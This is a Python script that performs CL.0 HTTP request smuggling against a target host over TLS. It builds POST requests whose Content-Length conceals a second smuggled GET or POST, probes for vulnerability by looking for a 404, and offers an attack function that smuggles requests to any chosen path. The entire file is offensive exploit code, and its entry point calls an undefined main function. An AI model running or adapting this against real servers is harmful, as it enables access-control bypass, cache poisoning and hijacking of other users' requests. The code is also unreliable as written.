import re
import socket
import ssl


def calculate_content_length(content):
    start = False
    size = 2
    for line in content.splitlines():
        if re.search('^$', line): 
            start = True
        if start:
            size += len(line)
    return size

def get_content_with_length(content,extra=0):
    size = calculate_content_length(content) + extra
    return re.sub(r'(content-length): \d+','\\1: %s' % size,content,flags=re.IGNORECASE)

def get_cl_0_content(hostname,url,attack_url='/notfound404'):
    data = """POST %s HTTP/1.1\r
Host: %s\r
Connection: keep-alive\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 10\r
\r
GET %s HTTP/1.1\r
Foo: x"""

    data = data % (url, hostname,attack_url)
    return get_content_with_length(data)

def get_cl_0_content_post(hostname,url,params,attack_url='/notfound404',size=100):
    data = """POST %s HTTP/1.1\r
Host: %s\r
Connection: keep-alive\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 10\r
\r
POST %s HTTP/1.1\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 120\r
\r
%s
"""

    data = data % (url,hostname,attack_url,params)
    return get_content_with_length(data,size)

def get_cl_0_normal(hostname):
    new_request = """GET / HTTP/1.1\r
Host: %s\r
Connection: close\r
\r
""" % hostname
    return new_request

def cl_0_probe(hostname,url,port=443):
    vulnerable = False

    first_request = get_cl_0_content(hostname,url)
    main_request = get_cl_0_normal(hostname)
    context = ssl.create_default_context()

    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            ssock.sendall(first_request.encode('utf-8'))
            ssock.sendall(main_request.encode('utf-8'))
            all_response = b''
            while True:
                data = ssock.recv(1024)
                if not data:
                    break
                all_response += data

            m = re.search(r"HTTP/1.1 404 Not Found",all_response.decode('utf-8'))
            if m:
                vulnerable = True

    return vulnerable


def cl_0_attack(hostname,url,attack_url,port=443):
    first_request = get_cl_0_content(hostname,url,attack_url)
    main_request = get_cl_0_normal(hostname)
    context = ssl.create_default_context()

    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            ssock.sendall(first_request.encode('utf-8'))
            ssock.sendall(main_request.encode('utf-8'))
            all_response = b''
            while True:
                data = ssock.recv(1024)
                if not data:
                    break
                all_response += data

            return all_response.decode('utf-8')

if __name__ == '__main__':
    exit(main())
